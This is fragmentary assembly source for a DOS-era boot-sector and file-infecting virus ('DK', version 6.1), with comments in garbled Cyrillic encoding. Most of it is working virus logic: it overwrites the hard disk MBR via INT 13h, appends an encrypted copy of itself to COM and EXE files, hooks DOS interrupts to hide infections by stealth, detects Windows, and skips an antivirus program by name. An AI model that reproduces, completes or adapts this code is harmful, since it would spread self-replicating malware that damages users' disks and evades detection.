...
;íp∩¬¿ (Γ«τ¬¿ ¿σ «ßΓá¡«óá)
        ...
        int      21h
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ VIRUS ENTRYPOINT ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;àß½¿ ¡á óσ«ñÑ DX = 'DK', Γ« ¿ñÑ¼ »p∩¼« ¡á ¡«p¼á½∞¡δ⌐ Σá⌐½
...
load_virus_via_int13:
        xor      bx,bx
        mov      ah,02h                       ;ù¿ΓáΓ∞ ßÑ¬Γ«pá
        mov      al,length_of_virus_in_sector ;æ¬«½∞¬« τ¿ΓáΓ∞
        mov      dx,0080h                     ;0 ú«½«ó¬á
        mov      cx,0003h                     ;0 µ¿½¿¡ñp 3 ßÑ¬Γ«p
        int      13h
        retn
;────────────────────────────────────────────────────────────────────────────
call_himem:
...
manager_idle_flag            db 0h ;1 MANAGER óδ¬½ετÑ¡
virus_in_xms_flag            db 0h ;1 é¿pπß¡«Ñ ΓÑ½« ¡áσ«ñ¿Γß∩ ó XMS
hooked_win_int21_flag        db 0h ;1 ÅÑpÑσóáτÑ¡ WIN_INT21
entry_manager:
        db       0EAh
hooked_win_int21:
        dd       ?
...
old_int8_vector_in_manager:
        dd       0
dos_int21_seg        dw 0
wait_next_int21_flag db 0 ;1 åñÑ¼ ß½ÑñπεΘÑú« »«½Ñ ñ«ßá «ípáí«Γτ¿¬á
;────────────────────────────────────────────────────────────────────────────
;éσ«ñ: DS=0
install_int21:
        les      bx,ds:[21h*4]
...
check_mbr:
        ...
        dw       31F5h
        db       61h ;éÑpß¿∩ ó¿pπßá v6.1
jump_version:
        push     virus_segment
        pop      es
        ;ù¿ΓáÑ¼ ó¿pπß ó é¿ñÑ« üπΣÑp BC00:0000
        mov      ah,02    ;ù¿ΓáΓ∞ ßÑ¬Γ«pá
...
;ÄΦ¿í¬á Ñß½¿ αáº¼Ñα Manager'á í«½∞ΦÑ τÑ¼ ¡áñ«
.errnz  offset(end_manager-begin_manager) GT (400h-M_ADDR)
        rep      movsb      ; DS:[SI] -> ES:[DI]
        ;ôßΓá¡áó½¿óáÑ¼ MANAGER_INT8_PROCESSING
        lds      bx,es:[8h*4]
        ...
        mov      ax,0201h ;ù¿ΓáΓ∞ «ñ¿¡ ßÑ¬Γ«p
        mov      bx,7C00h
        mov      dx,0080h ;0 ú«½«ó¬á
        mov      cx,0002h ;0 µ¿½¿¡ñp 2 ßÑ¬Γ«p
...
goto_virus:
        ...
        ;Åp«óÑp∩Ñ¼ φΓ« ¿¡ßΓ«½∩Γ«p
        cmp      bx,'DK'
        jz       GATE1_goto_normal_programm ;ê¡ßΓ«½∩Γ«p ñá½ º¡áΓ∞, τΓ« ºápáªáΓ∞ »«¬á pá¡«
        ...
        call     scan_mem_call
        jc       GATE1_goto_normal_programm ;Äí¡ápπª¿½¿ Windows NT
        mov      byte ptr ds:[bp+filename-virus],0
        lea      bx,[bp+endvirus-virus]
        mov      di,bx                      ;èπñá MBR ñ«½ªÑ¡ íδΓ∞ »p«τ¿Γá¡
        call     check_windows_present
        jc       DOS_MBR_readed
        inc      byte ptr ds:[bp+filename-virus]
        ;ES=CS πßΓá¡«ó¿½á check_windows_present
...
write_virus_to_mbr:
        ...
        ;1(MBR)+1(OLD_MBR)+(ä½¿¡¡á ó¿pπßá ó ßÑ¬Γ«páσ)+1(RESERVED)
        jc       GATE1_goto_normal_programm
        ;çá»¿ßδóáÑ¼ «α¿ú¿¡á½∞¡δ⌐ MBR ¡á ßÑ¬Γ«α
        mov      ax,0301h
        mov      dx,0080h ;0 ú«½«ó¬á
        mov      cx,0002h ;0 µ¿½¿¡ñp 2 ßÑ¬Γ«p (ßñÑß∞ ¼δ σpá¡¿¼ «p¿ú¿¡á½∞¡δ⌐ MBR)
        call     call_int_13
        jc       GATE1_goto_normal_programm
        ...
        mov      al,length_of_virus_in_sector
        mov      bx,bp
        inc      cx       ;0 µ¿½¿¡ñp 3 ßÑ¬Γ«p (ßñÑß∞ ¼δ σpá¡¿¼ ΓÑ½« ó¿pπßá)
        call     call_int_13
        jc       goto_normal_programm
        ;ÅÑpÑ¡«ß¿¼ ¡áΦπ MBR'¡πε τáßΓ∞ ó ¿σ¡¿⌐ MBR
        lea      si,[bp+begin_mbr-virus]   ;ÇñαÑß MBR-¡«⌐ τáßΓ¿ ó¿απßá.
        lea      di,[bp+endvirus-virus]    ;ÇñαÑß úñÑ «α¿ú. MBR ßÑ⌐τáß ¡áσ«ñ¿Γß∩
        ...
        jc       GATE1_goto_normal_programm
        ;ÅÑpÑσ«ñ¿¼ ó ºáΘ¿ΘÑ¡¡δ⌐ pÑª¿¼
        ;Há óσ«ñÑ ΓpÑíπÑΓß∩ ES - Åp¿óáΓ¡δ⌐ ßÑú¼Ñ¡Γ ñ½∩ DPMI
        mov      ax,cs
        add      ax,0500h
        mov      es,ax
        mov      ax,1
...
goto_normal_programm:
        push     cs
        pop      ds
        cmp      byte ptr ds:[bp+extention-virus],2    ;EXE Σá⌐½
        jz       itis_EXE_file
;───────────────────────────────── COM ──────────────────────────────────────
        pop      es ds
...
itis_EXE_file:
        ...
        popa
        cli
        db       02Eh,08Bh,26h   ;îÄV SP,CS:[XXXX]
sp_correct:
        dw       offset(old_first_20_byte-virus+10h)
        db       02Eh,08Eh,16h   ;îÄV SP,CS:[XXXX]
ss_correct:
...
virus_int21_processing:
        ...
        jnz      next_step_1
;───────────────────────────────────────────────────────────────────────────┐
;çáñáτá - »ÑpÑ¡ÑßΓ¿ »πΓ∞ ñ« ¿ß¬áÑ¼δσ Σá⌐½«ó                                 │
;DS:DX - »πΓ∞                                                              ;│
        pusha                                                              ;│
        push     es                                                        ;│
        mov      si,dx                                                     ;│
...
function_3B_5C:                                                            ;│
        ...
        mov      cx,80h                                                    ;│
        rep      movsb  ;DS:SI -> ES:DI                                    ;│
        mov      cs:[di],ax ;HANDLE ¬«»¿pπÑ¼«ú« Σá⌐½á                      ;│
        pop      es                                                        ;│
        popa                                                               ;│
        popf                                                               ;│
        clc                                                                ;│
...
next_step_5:
        ...
        jnz      next_step_6
;───────────────────────────────────────────────────────────────────────────┐
;ôßΓá¡«ó¿Γ∞ π¬áºáΓÑ½∞ Σá⌐½á ¡á ¬«¡Ñµ + CX:DX                               ;│
...
GATE1_set_old_int_24_jmpint21:                                             ;│
        ...
        ;BX.CX - Äp¿ú¿¡á½∞¡á∩ ñ½¿¡¡á ºápáªÑ¡¡«ú« Σá⌐½á                     ;│
        ;DX.AX - Current LSEEK                                             ;│
        sub      bx,dx                                                     ;│
        jc       lseek_biger                                               ;│
        sub      cx,ax                                                     ;│
...
lseek_no_biger:                                                            ;│
        ...
        jmp      read_file_3D                                              ;│
check_smallers:                                                            ;│
        ;CX - ¬«½¿τÑßΓó« íá⌐Γ ¬«Γ«p«Ñ ó«º¼«ª¡« »p«τ¿ΓáΓ∞                   ;│
        pop      ax ;è«½¿τÑßΓó« íá⌐Γ ¬«Γ«p«Ñ σ«Γ∩Γ »p«τ¿ΓáΓ∞               ;│
        cmp      ax,cx                                                     ;│
        jbe      read_file_3D                                              ;│
        mov      ax,cx                                                     ;│
read_file_3D:                                                              ;│
        ...
        popa                                                               ;│
        call     set_old_int24 ; æΓáó¿¼ ßΓáp«Ñ 24'«Ñ »αÑαδóá¡¿Ñ            ;│
...
;───────────────────────────────────────────────────────────────────────────┘
next_step_7:
        call     set_our_int24  ; æΓáó¿¼ ¡áΦÑ 24 »αÑαδóá¡¿Ñ
...
infect_not_allowed:                                                        ;│
        ...
        ;ÄípáíáΓδóáÑ¼ Γ«½∞¬« ºápáªÑ¡¡δÑ Σá⌐½δ                              ;│
        call     select_stealth_field                                      ;│
        ;éδσ«ñ: CF=0, ES:BX - æó«í«ñ¡«Ñ »«½Ñ                               ;│
        ;       CF=1, ¡ÑΓ »«½Ñ⌐ ßó«í«ñ¡δσ                                  ;│
...
call_zaraza:
        ...
        ;æΓáó¿¼ ßΓáp«Ñ ñáΓπ/ópÑ¼∩ ß«ºñá¡¿∩ Σá⌐½á
...
common_infected:
        ...
        mov      bp,sp
        call     set_dses_cs
        call     set_lseek_begin       ;èáτáÑ¼ 20h »Ñpóδσ íá⌐Γ ó OLD íπΣÑp
        mov      cx,20h
...
;─────────────────────────────── COM ────────────────────────────────────────
        ...
        jae      infect_error
        cmp      ax,200h
        jb       infect_error ;öá⌐½δ ¼Ñ¡∞ΦÑ φΓ«ú« páº¼Ñpá ¡Ñ ºápáªáÑ¼
        ...
        ;Å¿ΦÑ¼ BREAK BLOCK ¿ ºá¡¿¼ ºáΦ¿Σp«óá¡¡δ⌐ ó¿pπß
...
;BX = OLD_BUFFER
;DS=ES = CS
;üπΣÑp OLD ºá»«½¡Ñ¡ 20h íá⌐Γá¼¿ ¿º ¡áτá½á Σá⌐½á
go_infec_exe:
...
max_mem_above_then_30:
        ...
        call     crypt_virus_and_write_to_end
        jc       infect_error
        call     set_lseek_end ;éδσ«ñ: DX:AX - ¡á ¬«¡µÑ
        mov      cx,200h
        div      cx
        or       dx,dx
...
crypt_virus_and_write_to_end:
        pusha
        ;ä½∩ ¡áτá½á ßúÑ¡Ñp¿pπÑ¼ ß½πτá⌐¡«Ñ τ¿ß½«
...
exit_stc_may_infect_this_file:
        ...
        retn
;────────────────────────────────────────────────────────────────────────────
;éσ«ñ: DS:DX - íπΣΣÑp úñÑ πªÑ »p«τ¿Γá¡δ íá⌐Γδ
;      AX    - τ¿ß½« pÑá½∞¡« »p«τ¿Γá¡¡δσ íá⌐Γ
move_faked_bytes:
        pusha
        push     ds es
        push     ds cs
        ...
        ;DX.AX - π¬áºáΓÑ½∞ ßΓ«∩½ ¡á «í½áßΓ¿ ΣÑ⌐¬á
        add      si,ax ;ÄΓ¬πñá »ÑpÑ¡«ß¿Γ∞ ½«ª¡δÑ íá⌐Γδ
        sub      ax,20h
        neg      ax    ;ù¿ß½« íá⌐Γ ß¬«½∞¬« ¼δ ñ«½ª¡δ »«ñßΓáó¿Γ∞ ¿ßσ«ñ∩ ¿º »«½«ªÑ¡¿∩ LSEEK
        mov      cx,bp ;æ¬«½∞¬« »p«τ¿Γá¡« íá⌐Γ
        cmp      cx,ax
        jbe      move_f_bytes
        mov      cx,ax
move_f_bytes:
        jcxz     exit_move_faked_bytes
        rep      movsb ;DS:[SI] -> ES:[DI] ÅÑpÑ¡«ß¿¼ ½«ª¡δÑ íá⌐Γδ
...
exit_carry_fill_stealth_field:
        ...
        retn
;────────────────────────────────────────────────────────────────────────────
;Ä»¿ßá¡¿Ñ: Å«ñ»α«úαá¼¼á ¿ΘÑΓ ó ßΓÑ½ß íπΣΣÑαáσ HANDLE ß««ΓóÑΓßóπεΘ¿⌐ BX
;éσ«ñ:  BX   - Handle
;éδσ«ñ: CF=0 - ¡á⌐ñÑ¡ ß«ó»áñáεΘ¿⌐ σφ¡ñ½ ó Stealth Buffers
;              (Γ«τ¬á óσ«ñá pointer_to_active_stealth_buffer)
;       CF=1 - ß«ó»áñÑ¡¿⌐ ¡Ñ ¡á⌐ñÑ¡«
...
exit_install_int21_hook:
        ...
        retn
;────────────────────────────────────────────────────────────────────────────
;Ä»¿ßá¡¿Ñ: Åp«µÑñπpá ñÑΓÑ¬Γ¿p«óá¡¿∩ Windows 95/98
;éσ«ñ:  ES:[DI] - ópÑ¼Ñ¡¡δ⌐ íπΣΣÑp ó páº¼ÑpÑ 200h
;éδσ«ñ: CF = 1  - DOS
;       CF = 0  - Windows
...
;────────────────────────────────────────────────────────────────────────────
;Å«ñ»p«úpá¼¼á ñÑΓÑ¬Γ¿p«óá¡¿∩ Σá⌐½á (c)'98 DK
;êß»«½∞ºπÑΓß∩ ó¿pπßá¼¿ ñ½∩ «»pÑñÑ½Ñ¡¿∩ ¬á¬«⌐ Σá⌐½ ¼«ª¡« ºápáªáΓ∞, á
;¬á¬«⌐ ¡Ñ½∞º∩.
;éσ«ñ:  DS:DX - π¬áºδóáÑΓ ¡á ßΓp«¬π ó Σ«p¼Ñ: "ñ¿ß¬:\»πΓ∞\¿¼∩ Σá⌐½á",0
;       ä«½ª¡á íδΓ∞ «»pÑñÑ½Ñ¡á »«ñ»p«úpá¼¼á call_int21, σ«Γ∩ íδ ó«Γ Γá¬«ú«
;       ß«ñÑpªá¡¿∩:
...
filenames:                                                     ;│
        ...
        ;ê¼Ñ¡á ¡Ñ »p«óÑp∩Ñ¼δÑ ¡á páßΦ¿pÑ¡¿Ñ/¼áß¬π              ;│
        db       04,'CON',0     ;îáß¬á ¡Ñ »p«óÑp∩ÑΓß∩          ;│1
        db       04,'AUX',0     ;îáß¬á ¡Ñ »p«óÑp∩ÑΓß∩          ;│2
        db       04,'PRN',0     ;îáß¬á ¡Ñ »p«óÑp∩ÑΓß∩          ;│3
        db       05,'COM1',0    ;îáß¬á ¡Ñ »p«óÑp∩ÑΓß∩          ;│4
        db       05,'COM2',0    ;îáß¬á ¡Ñ »p«óÑp∩ÑΓß∩          ;│5
        ;ê¼Ñ¡á »p«óÑp∩Ñ¼δÑ ¡á páßΦ¿pÑ¡¿Ñ/¼áß¬π                 ;│
        db       07,'AVP.EXE'                                  ;│6
        db       0FFh ; - Åp¿º¡á¬ ¬«¡µá                        ;│
;═══════════════════════════════════════════════════════════════╡
...
;   2 - æ¼ÑΘÑ¡¿Ñ íÑpÑΓß∩ ¿º Σá⌐½á »« (1)*10h                    │
;   3 - æ¼ÑΘÑ¡¿Ñ íÑpÑΓß∩ «Γ ¬«¡µá                               │
;3) ä½¿¡¡á ¼áß¬¿                                                │
;4) îáß¬á:                                                      │
;   a)  æ¿¼ó«½ '?' - ½εí«Ñ τ¿ß½«                                │
;   b)  æ¿¼ó«½ '*' - ½εí«⌐ º¡á¬                                 │
...
;─────────────────────────────────────────────┴─────────────────┤
        db       0ffh ; - Åp¿º¡á¬ ¬«¡µá íáºδ                    │
;───────────────────────────────────────────────────────────────┘
end_solve_crc:
filename  db 0
extention db 1 ;¥Γ« COM Σá⌐½
filemask  db 0
Asciiz proc near
        pusha
        push     es ds dx
...
initial_offset_Asciiz:
        ...
        ;éσ«ñ:  DS:DX - "ñ¿ß¬:»πΓ∞\¿¼∩ Σá⌐½á",0
        call     seach_name_from_path
        ;éδσ«ñ: DS:DX - ¡áτá½« ¿¼Ñ¡¿ Σá⌐½á
        mov      si,dx
        mov      di,offset(common_buffer-virus)
        mov      cx,20h
...
next_mask:
        ...
        push     si
        cmp      byte ptr [si+2],0 ;(1) ¿ ÑßΓ∞ ß¼ÑΘÑ¡¿Ñ ¼áß¬¿
        jnz      no_0
        xor      cx,cx
        mov      dx,word ptr [si]
        mov      ax,4200h
...
no_0:
        cmp      byte ptr [si+2],1 ;æ¼ÑΘÑ¡¿Ñ íÑpÑΓß∩ ¿º Σá⌐½á »« (1)
        jnz      no_1
        xor      cx,cx
        mov      dx,[si]
        mov      ax,4200h
        ...
        jmp      read_and_check_mask
no_1:
        cmp      byte ptr [si+2],2 ;æ¼ÑΘÑ¡¿Ñ íÑpÑΓß∩ ¿º Σá⌐½á »« (1)*10h
        jnz      no_2
        xor      cx,cx
        mov      dx,[si]
        mov      ax,4200h
...
close_file:
        ...
        jmp      call_int21_with_use_handle
;────────────────────────────────────────────────────────────────────────────
; ü«p∞íá ß ¡áñ»¿ß∞ε "é«º¼«ª¡« ó »á¼∩Γ¿ ¡áσ«ñ¿Γß∩ á¬Γ¿ó¡δ⌐ ó¿pπß"
; çáñáτá πípáΓ∞ INT 21 ß manager'á
anti_mem:
        call     set_old_int24     ; æΓáó¿¼ ßΓáp«Ñ 24 »αÑαδóá¡¿Ñ
        pusha
        push     ds es
        push     0000h
        pop      ds
...
;ÅπΓ∞ ñ« Σá⌐½«ó ¬«Γ«pδÑ ¿ΘπΓ »« Σπ¡¬µ¿¿ 4F
path_for_4F_function               db 100h dup (?)
;ÅπΓ∞ ñ« Σá⌐½«ó ¬«Γ«pδÑ ¿ΘπΓ »« Σπ¡¬µ¿¿ 714F
...
;────────────────────────────────────────────────────────────────────────────
;üπΣΣÑp for Stealth function
stealth STRUC
handle_of_infected_file            dw  ?  ;HANDLE «Γ¬pδΓ«ú« ºápáªÑ¡¡«ú« Σá⌐½á
;(0) - Å«½Ñ ßó«í«ñ¡«
original_20h_bate_of_infected_file db  20h dup (?) ;Äp¿ú¿¡á½∞¡δÑ 20h íá⌐Γ
original_size_of_infected_file     dd  ?           ;Original Length of file
ends
;────────────────────────────────────────────────────────────────────────────
infect_after_copy STRUC
handle_of_copy_file                dw ?   ;HANDLE æ«ºñáóáÑ¼«ú« Σá⌐½á
file_name_of_copy_file             db 100h dup (?)  ;ê¼∩ Σá⌐½á
ends
;────────────────────────────────────────────────────────────────────────────
...
pointer_to_active_stealth_buffer dw ? ;ô¬áºáΓÑ½∞ ¡á á¬Γ¿ó¡δ⌐ æΓÑ½ß üπΣΣÑα
;────────────────────────────────────────────────────────────────────────────
